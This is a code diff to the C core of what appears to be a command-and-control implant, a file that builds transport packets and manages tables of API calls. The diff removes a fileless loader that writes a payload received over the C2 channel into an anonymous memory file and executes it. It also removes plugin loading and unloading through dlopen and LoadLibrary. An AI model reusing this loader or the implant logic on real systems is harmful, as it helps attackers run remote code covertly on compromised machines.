@@ -24,23 +24,17 @@
 
 #define _DEFAULT_SOURCE
 
+#include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <string.h>
 
-#ifdef WINDOWS
-#include <winsock2.h>
-#include <windows.h>
-#else
-#include <dlfcn.h>
-#endif
+#include <c2.h>
+#include <tlv.h>
+#include <log.h>
+#include <calls.h>
 
-#include "c2.h"
-#include "tlv.h"
-#include "log.h"
-#include "calls.h"
-
-#include "uthash/uthash.h"
+#include <uthash/uthash.h>
 
 /*
  * Craft TLV transport packet from primary TLV transport packet
@@ -101,112 +95,6 @@ void c2_add_str(c2_api_call_t *c2_api_call_new, char *c2_str)
 void c2_register_api_calls(c2_api_calls_t **c2_api_calls_table)
 {
     register_api_calls(c2_api_calls_table);
-}
-
-/*
- * Load C2 ELF on-fly from memory.
- */
-
-#ifdef LINUX
-int c2_load_elf_on_fly(tlv_transport_pkt_t tlv_transport_packet)
-{
-
-    int fd = memfd_create("", 0);
-
-    if (fd < 0)
-        return -1;
-
-    tlv_transport_channel_read_file_fd(tlv_transport_packet, fd);
-
-    char fd_path[20];
-    sprintf(&fd_path, "/proc/self/fd/%d", fd);
-    system(fd_path);
-
-    return fd;
-}
-#endif
-
-/*
- * Unload C2 API calls related to the specific API calls scope.
- */
-
-int c2_unload_api_calls(c2_api_calls_t **c2_api_calls_table, int c2_api_call_scope)
-{
-    c2_api_calls_t *c2_api_calls_new;
-    HASH_FIND_INT(*c2_api_calls_table, &c2_api_call_scope, c2_api_calls_new);
-
-    if (c2_api_calls_new->c2_api_call_plugin != NULL)
-    {
-        c2_api_call_handlers_t *c2;
-
-        for (c2 = c2_api_calls_new->c2_api_call_handlers; c2 != NULL; c2 = c2->hh.next)
-        {
-            log_debug("* Unloaded api call (%d)\n", c2->c2_api_call_tag);
-
-            HASH_DEL(c2_api_calls_new->c2_api_call_handlers, c2);
-            free(c2);
-        }
-
-        #ifdef WINDOWS
-        FreeLibrary(c2_api_calls_new->c2_api_call_plugin);
-        c2_api_calls_new->c2_api_call_plugin = NULL;
-        #else
-        dlclose(c2_api_calls_new->c2_api_call_plugin);
-        #endif
-
-        HASH_DEL(*c2_api_calls_table, c2_api_calls_new);
-
-        free(c2_api_calls_new->c2_api_call_handlers);
-        free(c2_api_calls_new);
-
-        log_debug("* Unloaded plugin call scope (%d)\n", c2_api_call_scope);
-        return 0;
-    }
-
-    return -1;
-}
-
-/*
- * Load C2 API calls from the shared object or dynamic library.
- */
-
-int c2_load_api_calls(c2_api_calls_t **c2_api_calls_table, char *plugin)
-{
-    int (*load_api_calls)(c2_api_calls_t **);
-
-    #ifdef WINDOWS
-    void *c2_api_call_plugin = LoadLibraryA(plugin);
-
-    if (!c2_api_call_plugin)
-        return -1;
-
-    *(FARPROC *)(&load_api_calls) = GetProcAddress(c2_api_call_plugin, "load_api_calls");
-    if (!load_api_calls)
-        return -1;
-
-    #else
-    void *c2_api_call_plugin = dlopen(plugin, RTLD_LAZY);
-    char *error;
-
-    if (!c2_api_call_plugin)
-        return -1;
-
-    dlerror();
-
-    *(void **)(&load_api_calls) = dlsym(c2_api_call_plugin, "load_api_calls");
-    if ((error = dlerror()) != NULL)
-        return -1;
-    #endif
-
-    int c2_api_call_scope = (*load_api_calls)(c2_api_calls_table);
-
-    c2_api_calls_t *c2_api_calls_new;
-    HASH_FIND_INT(*c2_api_calls_table, &c2_api_call_scope, c2_api_calls_new);
-
-    c2_api_calls_new->c2_api_call_plugin = c2_api_call_plugin;
-    log_debug("* Loaded plugin call scope (%d)\n", c2_api_call_scope);
-
-    return 0;
 }
 
 /*
@@ -326,27 +214,22 @@ void c2_api_calls_free(c2_api_calls_t *c2_api_calls_new)
 
     for (c2 = c2_api_calls_new; c2 != NULL; c2 = c2->hh.next)
     {
-        if (c2->c2_api_call_plugin != NULL)
-            c2_unload_api_calls(&c2_api_calls_new, c2->c2_api_call_scope);
-        else
+        c2_api_call_handlers_t *c2_handler;
+
+        for (c2_handler = c2_api_calls_new->c2_api_call_handlers; c2_handler != NULL; c2_handler = c2_handler->hh.next)
         {
-            c2_api_call_handlers_t *c2_handler;
+            log_debug("* Freed C2 API call (%d)\n", c2_handler->c2_api_call_tag);
 
-            for (c2_handler = c2_api_calls_new->c2_api_call_handlers; c2_handler != NULL; c2_handler = c2_handler->hh.next)
-            {
-                log_debug("* Freed C2 API call (%d)\n", c2_handler->c2_api_call_tag);
-
-                HASH_DEL(c2_api_calls_new->c2_api_call_handlers, c2_handler);
-                free(c2_handler);
-            }
-
-            log_debug("* Freed C2 API call scope (%d)\n", c2->c2_api_call_scope);
-
-            HASH_DEL(c2_api_calls_new, c2);
-
-            free(c2->c2_api_call_handlers);
-            free(c2);
+            HASH_DEL(c2_api_calls_new->c2_api_call_handlers, c2_handler);
+            free(c2_handler);
         }
+
+        log_debug("* Freed C2 API call scope (%d)\n", c2->c2_api_call_scope);
+
+        HASH_DEL(c2_api_calls_new, c2);
+
+        free(c2->c2_api_call_handlers);
+        free(c2);
     }
 
     free(c2_api_calls_new);
